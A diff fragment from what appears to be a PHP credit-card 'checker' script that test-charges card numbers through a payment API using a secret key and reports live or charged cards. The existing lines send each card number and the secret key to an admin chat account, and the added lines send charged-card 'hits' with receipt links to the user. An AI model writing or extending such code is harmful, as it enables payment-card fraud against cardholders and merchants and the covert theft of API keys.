@@ -155,9 +155,14 @@ if(strpos($result2, '"seller_message": "Payment complete."' )) {
 ➜ 𝗥𝗲𝗰𝗶𝗽𝘁: <a href=$receipturl>Here</a> <br>
 ';
 send_message($admin, "CC \nϲϲ ➔ <code>$lista</code>\nTYPE➠ Ccn $amt€ \nSK ➠ <code>$sk</code>");
+	 send_message($userid, "𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ♻️
+
+𝗖𝗖: <code>$lista</code>
+𝗥𝗘𝗦𝗨𝗟𝗧: <b>CCN Charged $amt$ 🔥</b>
+𝗥𝗘𝗖𝗘𝗜𝗣𝗧 𝗨𝗥𝗟: <a href='$receipturl'>Here</a>");
+}
     
 
-}
 
 elseif(strpos($result2,'"cvc_check": "pass"')){
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 𝗰𝘃𝘃 𝗹𝗶𝘃𝗲</span><br>';
